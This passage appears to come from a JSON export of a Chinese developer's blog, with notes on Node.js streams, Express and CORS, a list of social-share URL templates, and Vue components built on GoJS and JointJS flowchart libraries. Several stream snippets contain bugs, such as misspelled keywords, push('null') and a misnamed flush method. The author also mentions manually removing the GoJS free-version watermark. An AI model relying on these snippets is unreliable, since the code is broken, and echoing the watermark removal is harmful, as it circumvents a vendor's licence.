fs.createReadStream(&#39;logo.png&#39;).pipe(res);//返回给浏览器\n    request(&#39;https://imoooc/logo.png&#39;).pipe(res)//同上 边下载边pipe\n})</code></pre>\n<p>上面的复制文件代码就可以改成</p>\n<pre><code class=\"language-javascript\">var fs = require(&#39;fs&#39;);\nfs.createReadStream(&#39;1.mp4&#39;).pipe(fs.createWriteStream(&#39;copy.mp4&#39;))</code></pre>\n<pre><code class=\"language-javascript\">var Readable = require(&#39;stream&#39;).Readable\nvar Writable = require(&#39;stream&#39;).Writable\nvar readStream = new Readable()\nvar writeStream = new Writable()\nreadStream.push(&#39;I&#39;)\nreadStream.push(&#39;Love&#39;)\nreadStream.push(&#39;You\\n&#39;)\nreadStream.push(&#39;null&#39;)\nwriteStream._write = function(chunk,encode,cb){\n    console.log(chunk.toString())\n    cb()\n}\nreadStream.pipe(writeStream)\n</code></pre>\n<p>定制流</p>\n<pre><code class=\"language-javascript\">funcion ReadStream(){\n    stream.Readable.call(this)\n}\nutil.inherits(ReadStream,stream.Readable);//继承原型\nReadStream.prototype._read=function(){\n    this.push(&#39;I&#39;)\n    this.push(&#39;Love&#39;)\n    this.push(&#39;You\\n&#39;)\n    this.push(&#39;null&#39;)\n}\n\nfuncion WritStream(){\n    stream.Writable.call(this)\n    this._cached=new Buffer(&#39;&#39;)\n}\nutil.inherits(WritStream,stream.Writable);\nWritStream.prototype._write = function(chunk,encode,cb){\n    console.log(chunk.toString())\n    cb()\n}\n\nfunction TransfromStream(){\n    stream.Transform.call(this)\n}\nutil.inherits(TransfromStream,stream.Transfrom);\nTransfromStream.prototype._transform= function(chunk,encode,cb){\n    this.push(chunk)\n    cb()\n}\nTransfromStream.prototype.flush= function(cb){\n    this.push(&#39;On Yeah!&#39;)\n    cb()\n}\n\nvar rs= new ReadStream()\nvar ws = new WritStream();\nvar ts = new TransfromStream()\n\nrs.pipe(ts).pipe(ws)</code></pre>\n<p>createReadStream是给你一个ReadableStream，你可以听它的&#39;data&#39;，一点一点儿处理文件，用过的部分会被GC（垃圾回收），所以占内存少。</p>\n<p>readFile是把整个文件全部读到内存里，这种方式是把文件内容全部读入内存，然后再写入文件。对于小型的文本文件，这没有多大问题。但是对于体积较大的二进制文件，比如音频、视频文件，动辄几个GB大小，如果使用这种方法，很容易使内存<code>“爆仓”</code>。理想的方法应该是读一部分，写一部分，不管文件有多大，只要时间允许，总会处理完成，这里就需要用到流的概念</p>\n<p>node不适合的：\n极高并发数（电商）、\n密集CPU运算（最优化路线）、\n高安全高可靠性（银行）、\n内存精密控制和释放</p>\n<p>express中，req.param()方法是对params\\body\\query的封装，取值顺序是params-&gt;body-&gt;query。</p>\n<p>非简单请求的CORS（跨域）请求，会在正式通信之前，增加一次HTTP查询请求，称为&quot;预检&quot;请求（preflight）。在你的post请求之前会发送一次OPTIONS请求\n<a href=\"http://www.ruanyifeng.com/blog/2016/04/cors.html\">跨域资源共享 CORS 详解</a></p>\n<p>服务端重启会清除session.session持久化方法：cookies,redis,MongoDB,硬盘内存\n为了弥补HTTP的无状态，就有了cookies和session.之前没有seesion的时候都用的是cookies.\n当程序需要给某个客户端请求创建一个session时，服务器会检查请求里面是否包含sessionid,服务器把这个session找出来就行了。没有就创建，返回sessionid给客户端保存.\n<a href=\"https://www.jianshu.com/p/8f4cc45d712e\">koa-session</a></p>\n","index":18},{"filePath":"post\\2018\\7\\social.md","htmlPath":"/post/2018/7/social.html","name":"social.md","type":"md","title":"社交分享接口","date":"2018/7/4","categories":"Experience","tags":"日常记录","html":"<h3 id=\"社交分享接口\">社交分享接口</h3>\n<p>qzone       : &#39;<a href=\"http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=%7B%7BURL%7D%7D&amp;title=%7B%7BTITLE%7D%7D&amp;desc=%7B%7BDESCRIPTION%7D%7D&amp;summary=%7B%7BSUMMARY%7D%7D&amp;site=%7B%7BSOURCE%7D%7D&#39;\">http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url={{URL}}&amp;title={{TITLE}}&amp;desc={{DESCRIPTION}}&amp;summary={{SUMMARY}}&amp;site={{SOURCE}}&#39;</a>,\nqq          : &#39;<a href=\"http://connect.qq.com/widget/shareqq/index.html?url=%7B%7BURL%7D%7D&amp;title=%7B%7BTITLE%7D%7D&amp;source=%7B%7BSOURCE%7D%7D&amp;desc=%7B%7BDESCRIPTION%7D%7D&amp;pics=%7B%7BIMAGE%7D%7D&#39;\">http://connect.qq.com/widget/shareqq/index.html?url={{URL}}&amp;title={{TITLE}}&amp;source={{SOURCE}}&amp;desc={{DESCRIPTION}}&amp;pics={{IMAGE}}&#39;</a>,\ntencent     : &#39;<a href=\"http://share.v.t.qq.com/index.php?c=share&amp;a=index&amp;title=%7B%7BTITLE%7D%7D&amp;url=%7B%7BURL%7D%7D&amp;pic=%7B%7BIMAGE%7D%7D&#39;\">http://share.v.t.qq.com/index.php?c=share&amp;a=index&amp;title={{TITLE}}&amp;url={{URL}}&amp;pic={{IMAGE}}&#39;</a>,\nweibo       : &#39;<a href=\"https://service.weibo.com/share/share.php?url=%7B%7BURL%7D%7D&amp;title=%7B%7BTITLE%7D%7D&amp;pic=%7B%7BIMAGE%7D%7D&amp;appkey=%7B%7BWEIBOKEY%7D%7D&#39;\">https://service.weibo.com/share/share.php?url={{URL}}&amp;title={{TITLE}}&amp;pic={{IMAGE}}&amp;appkey={{WEIBOKEY}}&#39;</a>,</p>\n<p>douban      : &#39;<a href=\"http://shuo.douban.com/!service/share?href=%7B%7BURL%7D%7D&amp;name=%7B%7BTITLE%7D%7D&amp;text=%7B%7BDESCRIPTION%7D%7D&amp;image=%7B%7BIMAGE%7D%7D&amp;starid=0&amp;aid=0&amp;style=11&#39;\">http://shuo.douban.com/!service/share?href={{URL}}&amp;name={{TITLE}}&amp;text={{DESCRIPTION}}&amp;image={{IMAGE}}&amp;starid=0&amp;aid=0&amp;style=11&#39;</a>,\ndiandian    : &#39;<a href=\"http://www.diandian.com/share?lo=%7B%7BURL%7D%7D&amp;ti=%7B%7BTITLE%7D%7D&amp;type=link&#39;\">http://www.diandian.com/share?lo={{URL}}&amp;ti={{TITLE}}&amp;type=link&#39;</a>,\nlinkedin    : &#39;<a href=\"http://www.linkedin.com/shareArticle?mini=true&amp;ro=true&amp;title=%7B%7BTITLE%7D%7D&amp;url=%7B%7BURL%7D%7D&amp;summary=%7B%7BSUMMARY%7D%7D&amp;source=%7B%7BSOURCE%7D%7D&amp;armin=armin&#39;\">http://www.linkedin.com/shareArticle?mini=true&amp;ro=true&amp;title={{TITLE}}&amp;url={{URL}}&amp;summary={{SUMMARY}}&amp;source={{SOURCE}}&amp;armin=armin&#39;</a>,\nfacebook    : &#39;<a href=\"https://www.facebook.com/sharer/sharer.php?u=%7B%7BURL%7D%7D&amp;title=%7B%7BTITLE%7D%7D&amp;description=%7B%7BDESCRIPTION%7D%7D&amp;caption=%7B%7BSUBHEAD%7D%7D&amp;link=%7B%7BURL%7D%7D&amp;picture=%7B%7BIMAGE%7D%7D&#39;\">https://www.facebook.com/sharer/sharer.php?u={{URL}}&amp;title={{TITLE}}&amp;description={{DESCRIPTION}}&amp;caption={{SUBHEAD}}&amp;link={{URL}}&amp;picture={{IMAGE}}&#39;</a>,\ntwitter     : &#39;<a href=\"https://twitter.com/intent/tweet?text=%7B%7BTITLE%7D%7D&amp;url=%7B%7BURL%7D%7D&amp;via=%7B%7BSITE_URL%7D%7D&#39;\">https://twitter.com/intent/tweet?text={{TITLE}}&amp;url={{URL}}&amp;via={{SITE_URL}}&#39;</a>,\ngoogle      : &#39;<a href=\"https://plus.google.com/share?url=%7B%7BURL%7D%7D&#39;\">https://plus.google.com/share?url={{URL}}&#39;</a></p>\n<h5 id=\"微博\">微博</h5>\n<p><a href=\"http://service.weibo.com/share/share.php\">http://service.weibo.com/share/share.php</a>?</p>\n<pre><code>url=\n&amp;title=\n&amp;pic=可为空\n&amp;appkey=可为空</code></pre><h5 id=\"发送给qq好友\">发送给QQ好友</h5>\n<p><a href=\"http://connect.qq.com/widget/shareqq/index.html\">http://connect.qq.com/widget/shareqq/index.html</a>?</p>\n<pre><code>url=\ntitle=\nsource= 默认读取head标签的site：&lt;meta name=&quot;site&quot; content=&quot;http://overtrue&quot; /&gt;\ndesc=默认读取head标签的description：&lt;meta name=&quot;description&quot; content=&quot;http://overtrue&quot; /&gt;\npics=</code></pre><h5 id=\"腾讯微博\">腾讯微博</h5>\n<p><a href=\"http://share.v.t.qq.com/index.php\">http://share.v.t.qq.com/index.php</a>?</p>\n<pre><code>c=share\na=index\ntitle=\nurl=\npic=</code></pre><h5 id=\"豆瓣\">豆瓣</h5>\n<p><a href=\"https://www.douban.com/share/service\">https://www.douban.com/share/service</a>?</p>\n<pre><code>href=\n&amp;name=\n&amp;text=</code></pre><h5 id=\"豆瓣-1\">豆瓣</h5>\n<p><a href=\"http://shuo.douban.com/!service/share\">http://shuo.douban.com/!service/share</a>?</p>\n<pre><code>href=\nname=\ntext=\nimage=\nstarid=0\naid=0\nstyle=11</code></pre><h5 id=\"qq空间这个好像腾讯坏了，都是undefined\">QQ空间(这个好像腾讯坏了，都是undefined)</h5>\n<p><a href=\"http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey\">http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey</a>?</p>\n<pre><code>url=\ndesc=\nsummary=\nsite=</code></pre><h5 id=\"linkin\">linkin</h5>\n<p><a href=\"http://www.linkedin.com/shareArticle\">http://www.linkedin.com/shareArticle</a>?</p>\n<pre><code>mini=true\nro=true\ntitle=\nurl=\nsummary=\nsource=\narmin=armin</code></pre><h5 id=\"点点（不知道是什么东西）\">点点（不知道是什么东西）</h5>\n<p><a href=\"http://www.diandian.com/share\">http://www.diandian.com/share</a>?</p>\n<pre><code>lo= 文章链接\nti= 文章标题\ntype=link</code></pre><h5 id=\"facebook\">facebook</h5>\n<p><a href=\"https://www.facebook.com/sharer/sharer.php\">https://www.facebook.com/sharer/sharer.php</a>?</p>\n<pre><code>u= 文章链接</code></pre><h5 id=\"twitter\">twitter</h5>\n<pre><code>https://twitter.com/intent/tweet?\ntext= 文章标题\nurl=\nvia= 好像是域名</code></pre><h5 id=\"google\">google</h5>\n<pre><code>https://plus.google.com/share?\nurl=</code></pre>","index":19},{"filePath":"post\\2018\\8\\procedure.md","htmlPath":"/post/2018/8/procedure.html","name":"procedure.md","type":"md","title":"vue中使用gojs/jointjs","date":"2018/8/23","categories":"Experience","tags":"专题探究","html":"<p>因为公司项目需求，要画出相关业务的流程图，以便客户了解自己身处何处</p>\n<p>搜索框输入 “前端流程图插件”，查了很多资料，总结一下有以下几种</p>\n<h3 id=\"raphael\">Raphael</h3>\n<p><a href=\"http://dmitrybaranovskiy.github.io/raphael/reference.html\">http://dmitrybaranovskiy.github.io/raphael/reference.html</a>\n这个星星很多，但是我找到的demo都要自己设置x坐标，y坐标，找不到自动布局的demo</p>\n<p><a href=\"http://www.weixuehao.com/archives/370\">http://www.weixuehao.com/archives/370</a></p>\n<h3 id=\"flow-chart\">flow-chart</h3>\n<p>代码写法繁琐，不是json就可以解决，效果也比较丑,PASS</p>\n<h3 id=\"darge-d3\">darge-d3</h3>\n<p>github :<a href=\"https://github.com/dagrejs/dagre-d3\">https://github.com/dagrejs/dagre-d3</a></p>\n<p>效果图\n{% asset_img darge-d3.png %}</p>\n<p>下载里面的demo,改一下json就可以了</p>\n<pre><code class=\"language-json\">// States \nvar states = [ &quot;NEW&quot;, &quot;SUBMITTED&quot;,&quot;FINISHED&quot; ,&quot;FAILED&quot;,&quot;DELIVER&quot;, \n               &quot;CANCELED&quot;, &quot;ABOLISHED&quot; , &quot;DELETED&quot;,&quot;REFUNDING&quot;,&quot;REFUNDED&quot;];\nvar map = [&#39;新创建&#39;,&#39;已提交&#39;,&#39;已完成&#39;,&#39;提交失败&#39;,&quot;交付中&quot;,\n              &#39;已取消&#39;,&#39;废除&#39;,&#39;已删除&#39;,&#39;退款中&#39;,&quot;已退款&quot;]\n// Automatically label each of the nodes\nstates.forEach(function(state,index) { g.setNode(state, { label: `${map[index]}(${state})`})});\n\n// Set up the edges\ng.setEdge(&quot;NEW&quot;, &quot;FAILED&quot;,     { label: &quot;后台接口自动&quot;});\ng.setEdge(&quot;NEW&quot;, &quot;SUBMITTED&quot;,   { label: &quot;后台接口自动&quot; });\ng.setEdge(&quot;NEW&quot;, &quot;CANCELED&quot;,   { label: &quot;用户取消订单&quot; });\ng.setEdge(&quot;SUBMITTED&quot;,&quot;CANCELED&quot;,     { label: &quot;用户取消订单&quot; });\ng.setEdge(&quot;SUBMITTED&quot;, &quot;ABOLISHED&quot;,  { label: &quot;用户超过48小时未支付，\\n系统自动取消&quot;});\ng.setEdge(&quot;ABOLISHED&quot;,&quot;DELETED&quot;,      { label: &quot;已删除&quot; });\ng.setEdge(&quot;CANCELED&quot;, &quot;DELETED&quot;,   { label: &quot;已删除&quot;});\ng.setEdge(&quot;FAILED&quot;,   &quot;SUBMITTED&quot;,      { label: &quot;后台接口自动&quot; });\n\ng.setEdge(&quot;SUBMITTED&quot;,   &quot;DELIVER&quot;,     { label: &quot;用户支付&quot; });\ng.setEdge(&quot;FINISHED&quot;,   &quot;REFUNDING&quot;,     { label: &quot;用户退款&quot; });\n\ng.setEdge(&quot;DELIVER&quot;,   &quot;FINISHED&quot;,     { label: &quot;交付完成&quot; });\ng.setEdge(&quot;REFUNDING&quot;,   &quot;REFUNDED&quot;,     { label: &quot;已退款&quot; });\ng.setEdge(&quot;REFUNDED&quot;,   &quot;DELETED&quot;,     { label: &quot;已删除&quot; });\ng.setEdge(&quot;DELIVER&quot;,   &quot;REFUNDING&quot;,     { label: &quot;用户退款&quot; });\ng.setEdge(&quot;FAILED&quot;,   &quot;CANCELED&quot;,     { label: &quot;用户取消订单&quot; });</code></pre>\n<p><strong>不满意的地方</strong>：画出来的图是垂直方向的，我要的是水平方向,PASS</p>\n<h3 id=\"gojs\">gojs</h3>\n<p>github :<a href=\"https://github.com/NorthwoodsSoftware/GoJS\">https://github.com/NorthwoodsSoftware/GoJS</a></p>\n<p>可以通过<code>npm install gojs -save</code>安装</p>\n<p>效果图\n{% asset_img gojs.png %}</p>\n<p>看里面的demo我自己包装了一下</p>\n<pre><code class=\"language-html\">&lt;template&gt;\n&lt;div&gt;\n  &lt;p style=&quot;background-color:#d5d5d5;margin:0;padding:5px;&quot;&gt;\n    您当前处于 &lt;span class=&quot;tip&quot;&gt;用户提交资料&lt;/span&gt; 步骤 \n    下一步等待&lt;span class=&quot;tip&quot;&gt;供应商接单&lt;/span&gt;\n    &lt;el-button type=&quot;text&quot; v-if=&quot;show===false&quot; @click=&quot;show=true&quot;&gt;展开&lt;/el-button&gt;\n    &lt;el-button type=&quot;text&quot; v-else @click=&quot;show=false&quot;&gt;收起&lt;/el-button&gt;\n\n  &lt;/p&gt;\n  &lt;div id=&quot;myDiagramDiv&quot; v-show=&quot;show&quot;  &gt;&lt;/div&gt;\n  &lt;/div&gt; \n\n&lt;/template&gt;\n&lt;style scoped&gt;\n.tip{\n  color:red;\n  font-size:0.8em;\n  font-weight:bold;\n  padding:5px;\n}\n#myDiagramDiv{\n  height: 200px; \n  border: solid 1px #d3d3d3;\n}\n\n&lt;/style&gt;</code></pre>\n<pre><code class=\"language-javascript\">&lt;script&gt;\nwindow.go =require(&#39;./go.js&#39;) \nvar $ = go.GraphObject.make;\n\nimport datam from &#39;./data&#39;;\nexport default{\n  mixins:[datam],\n  data(){\n    return{\n      myDiagram:null,\n      show:true\n    }\n  },\n  mounted(){\n    this.load();\n  },\n  methods:{\n    load(){\n      this.init();\n      this.addNodeTemplate(this.User);\n      this.addNodeTemplate(this.Supplier);\n      this.layout();\n    },\n    layout() {\n      this.myDiagram.model = go.Model.fromJson(this.myjson);\n      this.myDiagram.layoutDiagram(true);\n    },\n\n    getOption(){\n      // for conciseness in defining templates\n\n      let options={\n        yellowgrad : $(go.Brush, &quot;Linear&quot;, { 0: &quot;rgb(254, 201, 0)&quot;, 1: &quot;rgb(254, 162, 0)&quot; }),\n        greengrad : $(go.Brush, &quot;Linear&quot;, { 0: &quot;#98FB98&quot;, 1: &quot;#9ACD32&quot; }),\n        bluegrad : $(go.Brush, &quot;Linear&quot;, { 0: &quot;#B0E0E6&quot;, 1: &quot;#87CEEB&quot; }),\n        redgrad : $(go.Brush, &quot;Linear&quot;, { 0: &quot;#C45245&quot;, 1: &quot;#871E1B&quot; }),\n        whitegrad : $(go.Brush, &quot;Linear&quot;, { 0: &quot;#F0F8FF&quot;, 1: &quot;#E6E6FA&quot; }),\n        bigfont : &quot;bold 8pt Helvetica, Arial, sans-serif&quot;,\n        smallfont : &quot;bold 6pt Helvetica, Arial, sans-serif&quot;,\n\n      }\n\n      return options;\n    },\n\n     textStyle(){\n        return {\n          margin: 6,\n          wrap: go.TextBlock.WrapFit,\n          textAlign: &quot;center&quot;,\n          editable: true,\n          font: this.getOption()[&#39;bigfont&#39;]\n        }\n      },\n      init(){\n        this.myDiagram =\n            $(go.Diagram, &quot;myDiagramDiv&quot;,\n              {\n                isReadOnly: true,\n                // have mouse wheel events zoom in and out instead of scroll up and down\n                &quot;toolManager.mouseWheelBehavior&quot;: go.ToolManager.WheelNone,\n                initialAutoScale: go.Diagram.Uniform,\n                &quot;linkingTool.direction&quot;: go.LinkingTool.ForwardsOnly,\n                initialContentAlignment: go.Spot.Center,\n                layout: $(go.LayeredDigraphLayout, { isInitial: false, isOngoing: false, layerSpacing: 50 }),\n                &quot;undoManager.isEnabled&quot;: true\n              });\n              //默认节点模板\n        this.myDiagram.nodeTemplate =\n            $(go.Node, &quot;Auto&quot;,\n              new go.Binding(&quot;location&quot;, &quot;loc&quot;, go.Point.parse).makeTwoWay(go.Point.stringify),\n              // define the node&#39;s outer shape, which will surround the TextBlock\n              $(go.Shape, &quot;Rectangle&quot;,\n                { fill: this.getOption()[&#39;yellowgrad&#39;], stroke: &quot;black&quot;,\n                  portId: &quot;&quot;, fromLinkable: true, toLinkable: true, cursor: &quot;pointer&quot;,\n                  toEndSegmentLength: 50, fromEndSegmentLength: 40 }),\n              $(go.TextBlock, &quot;Page&quot;,\n                { margin: 6,\n                  font: this.getOption()[&#39;bigfont&#39;],\n                  editable: true },\n                new go.Binding(&quot;text&quot;, &quot;text&quot;).makeTwoWay()));\n            // replace the default Link template in the linkTemplateMap\n          this.myDiagram.linkTemplate =\n                $(go.Link,  // the whole link panel\n                  new go.Binding(&quot;points&quot;).makeTwoWay(),\n                  { curve: go.Link.Bezier, toShortLength: 15 },\n                  new go.Binding(&quot;curviness&quot;, &quot;curviness&quot;),\n                  $(go.Shape,  // the link shape\n                    { stroke: &quot;#2F4F4F&quot;, strokeWidth: 2.5 }),\n                  $(go.Shape,  // the arrowhead\n                    { toArrow: &quot;kite&quot;, fill: &quot;#2F4F4F&quot;, stroke: null, scale: 2 })\n                  );\n      },\n      /**\n       * options:{\n       *  category\n       *  shape:RoundedRectangle/Rectangle\n       *  shapeOptions:{\n       *   fill:bluegrad/greengrad/yellowgrad/null/redgrad/whitegrad  自定义的\n       *   stroke: &quot;black&quot;,\n       *   portId:&quot;&quot;\n       *   fromLinkable:true\n       *   toLinkable:\n       *   cursor:&quot;pointer&quot;\n       *   fromEndSegmentLength:40\n       *    toEndSegmentLength\n       *    strokeWidth\n       *  \n       *   }\n       *    textStyle:{\n       *        margin: 9,\n       *        maxSize: new go.Size(200, NaN),\n       *        wrap: go.TextBlock.WrapFit,\n        *       editable: true,\n        *       textAlign: &quot;center&quot;,\n        *       font: smallfont \n        * },\n       *    \n       * }\n       */\n      addNodeTemplate(options){\n        let fill = this.getOption()[options.shapeOptions.fill];\n        options.shapeOptions.fill = fill;\n        this.myDiagram.nodeTemplateMap.add(options.category,\n          $(go.Node, &quot;Auto&quot;,\n            new go.Binding(&quot;location&quot;, &quot;loc&quot;, go.Point.parse).makeTwoWay(go.Point.stringify),\n            $(go.Shape, options.shape,options.shapeOptions),\n            $(go.TextBlock,  this.textStyle(),\n              new go.Binding(&quot;text&quot;, &quot;text&quot;).makeTwoWay())\n            ));\n      },\n\n    }\n\n\n}\n\n&lt;/script&gt;\n\n</code></pre>\n<p><strong>不满意的地方</strong>：</p>\n<ol>\n<li>免费版gojs是有水印的，百度搜索“gojs如何去水印”有一堆答案，我就不写了。</li>\n<li>因为要自己手动去掉水印，所以我只能手动下载go.js放在我自己的组件目录下，但是这个文件太大了，800+KB,\nnpm run dev 的时候停在这里停了好久。有时候还爆出“......maximun ....500KB”的错误，我也不知道是什么原因，不知道有什么方法，有的话麻烦通知我。</li>\n<li>代码写法有点太繁琐</li>\n</ol>\n<p>这是我自己包装的代码地址：<a href=\"https://github.com/LRY1994/vue-lib/tree/master/src/components/process-go\">https://github.com/LRY1994/vue-lib/tree/master/src/components/process-go</a></p>\n<h3 id=\"jointjs\">jointjs</h3>\n<p>github : <a href=\"https://github.com/clientIO/joint\">https://github.com/clientIO/joint</a> \n效果图\n{% asset_img jointjs.png %}</p>\n<p>可以通过<code>npm install jointjs -save</code>安装</p>\n<p>参照了很多demo和文档，用的是矩形，但是可以设置圆角的度数变成椭圆形，其他形状我就无力了。</p>\n<p>可以自定义矩形的样式和矩形框里面的文字样式</p>\n<pre><code class=\"language-javascript\">//data.vue\n&lt;script&gt;\nexport default {\n    data(){\n        var userClass = {//这个要参照SVG属性\n            /**shapeStyle\n             * fill:填充的背景颜色\n                stroke: 边框颜色\n                strokeWidth: 边框宽度\n                rx: 圆角\n                ry: \n             */\n            shapeStyle:{//矩形样式\n                fill:{\n                    type: &#39;linearGradient&#39;,\n                    stops: [\n                        {offset: &#39;0%&#39;, color: &#39;#98FB98&#39;},\n                        {offset: &#39;100%&#39;, color: &#39;#9ACD32&#39;}\n                    ],\n                },\n                rx:150,\n                ry:15\n            },\n            /**\n             * textStyle\n             *  fontWeight\n             *  fontSize\n             * \n             */\n            textStyle:{//文本样式\n                fontWeight:&#39;bold&#39;\n            }    \n        };\n        return{\n            graphData :{\n                node:{\n                    &#39;100&#39;:{text:&#39;用户提交资料&#39;,category:userClass},\n                    &#39;101&#39;:{text:&#39;用户完善资料&#39;,category:userClass},\n                    &#39;102&#39;:{text:&#39;用户确认完成&#39;,category:userClass},\n                    &#39;103&#39;:{text:&#39;用户撤销&#39;,category:userClass},\n\n                    &#39;200&#39;:{text:&#39;供应商驳回&#39;},\n                    &#39;201&#39;:{text:&#39;供应商接单&#39;},\n                    &#39;202&#39;:{text:&#39;供应商完工&#39;},\n                    &#39;203&#39;:{text:&#39;等待供应商处理&#39;},\n\n                    &#39;300&#39;:{text:&#39;系统交付出错&#39;}               \n                },\n                edge :{//每个点都要写\n                    &#39;100&#39;: [&#39;200&#39;,&#39;201&#39;,&#39;103&#39;], \n                    &#39;101&#39;: [&#39;201&#39;],\n                    &#39;102&#39;:[],\n                    &#39;103&#39;: [&#39;100&#39;],\n\n                    &#39;200&#39;: [&#39;101&#39;],              \n                    &#39;201&#39;: [&#39;202&#39;,&#39;300&#39;],\n                    &#39;202&#39;: [&#39;102&#39;],               \n                    &#39;203&#39;: [&#39;102&#39;], \n\n                    &#39;300&#39;: [&#39;203&#39;],\n\n                },\n            }\n        }\n    }\n}\n&lt;/script&gt;\n</code></pre>\n<pre><code class=\"language-html\">&lt;template&gt;\n&lt;div id=&quot;container&quot;&gt;\n  &lt;p style=&quot;background-color:#EEEEEE;margin:0;padding:5px;font-size:0.9em&quot;&gt;\n    您当前处于 &lt;span class=&quot;tip&quot;&gt;用户提交资料&lt;/span&gt; 步骤 \n    下一步等待&lt;span class=&quot;tip&quot;&gt;供应商接单&lt;/span&gt;\n    &lt;el-button type=&quot;text&quot; v-if=&quot;show===false&quot; @click=&quot;show=true&quot;&gt;展开&lt;/el-button&gt;\n    &lt;el-button type=&quot;text&quot; v-else @click=&quot;show=false&quot;&gt;收起&lt;/el-button&gt;\n\n  &lt;/p&gt;\n    &lt;div id=&quot;myholder&quot; v-show=&quot;show&quot;&gt;&lt;/div&gt;\n&lt;/div&gt;\n&lt;/template&gt;</code></pre>\n<pre><code class=\"language-javascript\">&lt;script&gt;\nwindow.joint=require(&#39;jointjs&#39;);\nvar Shape = joint.dia.Element.define(&#39;default.Rectangle&#39;, {      \n        attrs: {  \n            rect: {\n                refWidth: &#39;100%&#39;,\n                refHeight: &#39;100%&#39;,\n                //下面这些可以自己设置\n                fill:{\n                    type: &#39;linearGradient&#39;,\n                    stops: [\n                        {offset: &#39;0%&#39;, color: &#39;#B0E0E6&#39;},//渐变开始\n                        {offset: &#39;100%&#39;, color: &#39;#F0F8FF&#39;}//渐变结束\n                    ]\n                },\n                stroke: &#39;#B0E0E6&#39;,\n                strokeWidth: 1,\n                rx: 5,//圆角\n                ry: 5\n            },\n            text: {\n                refX: &#39;50%&#39;,\n                refY: &#39;50%&#39;,                               \n                textVerticalAnchor: &#39;middle&#39;,\n                textAnchor: &#39;middle&#39;,\n                fontSize: 10           \n            }\n         }                    \n    }, \n    {\n         markup: &#39;&lt;rect/&gt;&lt;text/&gt;&#39;,\n         setText: function(text) {                    \n            return this.attr(&#39;text/text&#39;, text || &#39;&#39;);\n        },\n        setShapeStyle:function(shapeStyle){\n            let newstyle = Object.assign({},this.attr(&#39;rect&#39;),shapeStyle);\n            return this.attr(&#39;rect&#39;,newstyle)\n        },\n\n        setTextStyle:function(textStyle){\n            let newstyle = Object.assign({},this.attr(&#39;text&#39;),textStyle);\n            return this.attr(&#39;text&#39;,newstyle)\n        }\n    }\n);\n\nvar Link = joint.dia.Link.define(&#39;default.Link&#39;, {\n        attrs: {\n            &#39;.connection&#39;: {\n                stroke: &#39;#2F4F4F&#39;,//线\n                strokeWidth: 1,\n                pointerEvents: &#39;none&#39;,\n                targetMarker: {//箭头\n                    type: &#39;path&#39;,\n                    fill: &#39;#2F4F4F&#39;,//填充颜色\n                    stroke: &#39;#2F4F4F&#39;,//边框颜色\n                    strokeWidth:&#39;1&#39;,\n                    d: &#39;M 2 -2 0 0 2 2 z&#39;//形状\n                }\n            }\n        },\n        connector: {\n            name: &#39;rounded&#39;\n        },\n        z: -1,\n        weight: 1,\n        minLen: 1,\n        labelPosition: &#39;c&#39;,\n        labelOffset: 10,\n        labelSize: {\n            width: 50,\n            height: 30\n        },\n        labels: [{\n            markup: &#39;&lt;rect/&gt;&lt;text/&gt;&#39;,\n            attrs: {\n                text: {\n                    fill: &#39;gray&#39;,\n                    textAnchor: &#39;middle&#39;,\n                    refY: 5,\n                    refY2: &#39;-50%&#39;,\n                    fontSize: 10,\n                    cursor: &#39;pointer&#39;\n                },\n                // rect: {\n                //     fill: &#39;lightgray&#39;,\n                //     stroke: &#39;gray&#39;,\n                //     strokeWidth: 2,\n                //     refWidth: &#39;100%&#39;,\n                //     refHeight: &#39;100%&#39;,\n                //     refX: &#39;-50%&#39;,\n                //     refY: &#39;-50%&#39;,\n                //     rx: 5,\n                //     ry: 5\n                // }\n            },\n            size: {\n                width: 50, height: 10\n            }\n        }]\n\n    }, {\n        markup: &#39;&lt;path class=&quot;connection&quot;/&gt;&lt;g class=&quot;labels&quot;/&gt;&#39;,\n\n        connect: function(sourceId, targetId) {\n            return this.set({\n                source: { id: sourceId },\n                target: { id: targetId }\n            });\n        },\n\n        setLabelText: function(text) {\n            return this.prop(&#39;labels/0/attrs/text/text&#39;, text || &#39;&#39;);\n        }\n    });\n\n\n\nvar ElementView = joint.dia.ElementView.extend({\n        pointerdown: function () {\n\n            // this._click = true;\n            // joint.dia.ElementView.prototype.pointerdown.apply(this, arguments);\n        },\n        pointermove: function(evt, x, y) {\n            // this._click = false;\n            // joint.dia.ElementView.prototype.pointermove.apply(this, arguments);\n        },\n        pointerup: function (evt, x, y) {\n            // if (this._click) {\n            //     // triggers an event on the paper and the element itself\n            //     this.notify(&#39;cell:click&#39;, evt, x, y); \n            // } else {\n            //     joint.dia.ElementView.prototype.pointerup.apply(this, arguments);\n            // }\n        }\n    });\nvar LinkView = joint.dia.LinkView.extend({\n    addVertex: function(evt, x, y) {},\n    removeVertex: function(endType) {},\n    pointerdown:function(evt, x, y) {}\n});\n\n\nexport default {   \n    data(){\n        return{\n            graph:null,\n            paper:null,\n            show:true\n        }       \n    },\n    props:{\n        graphData:{\n            type:Object,\n            required:true\n        }\n    },\n    mounted(){\n        let w = document.getElementById(&#39;container&#39;).width ; \n        this.graph = new joint.dia.Graph;\n        this.paper = new joint.dia.Paper({\n            el: document.getElementById(&#39;myholder&#39;),\n            width: w,\n            height: 250,         \n            model: this.graph,\n            elementView: ElementView,//禁止拖拽\n            linkView:LinkView//禁止拖拽\n        });\n        this.layout();\n    },\n    methods:{\n        getWidthandHeight(label){\n            let maxLineLength = _.max(label.split(&#39;\\n&#39;), function(l) { return l.length; }).length,\n\n            // Compute width/height of the rectangle based on the number\n            // of lines in the label and the letter size. 0.6 * letterSize is\n            // an approximation of the monospace font letter width.\n             letterSize = 8,\n             width = 2 * (letterSize * (0.6 * maxLineLength + 1)),\n             height = 2 * ((label.split(&#39;\\n&#39;).length + 1) * letterSize);\n            return {width,height}\n        },\n        getLayoutOptions() {\n            return {\n                // setVertices: false,\n                // setLabels: false,\n                // ranker:&#39;longer-path&#39;,//&#39;tight-tree&#39;/&#39;network-simplex&#39;,\n                rankDir: &#39;LR&#39;,\n                align: &#39;UR&#39;,\n                rankSep:0,\n                edgeSep:0,\n                nodeSep:0,\n            };\n        },\n        buildGraphFromAdjacencyList(adjacencyList) {\n            let elements = [],links = [],obj,size,node;\n            const _this=this;\n            const map=this.graphData.node;\n\n            Object.keys(adjacencyList).forEach(function(parentId) 